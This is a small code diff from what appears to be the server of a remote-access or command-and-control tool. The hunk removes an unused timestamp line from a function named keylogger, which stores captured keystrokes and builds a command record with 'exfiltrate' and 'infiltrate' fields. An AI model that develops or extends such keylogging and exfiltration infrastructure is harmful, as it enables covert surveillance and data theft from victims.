@@ -62,7 +62,6 @@ def keylogger( id, keylog_value ):
 		else:
 			print("id not found in the database")
 			print("creating new entry in database...")
-			seconds_from_epoch = int(time.time())
 			empty_json = "e30="
 			default_group_id = 1
 			formatted_command = "{\"commands\": {}, \"exfiltrate\": {}, \"infiltrate\": {}, \"keylogger\": " + value + "}"
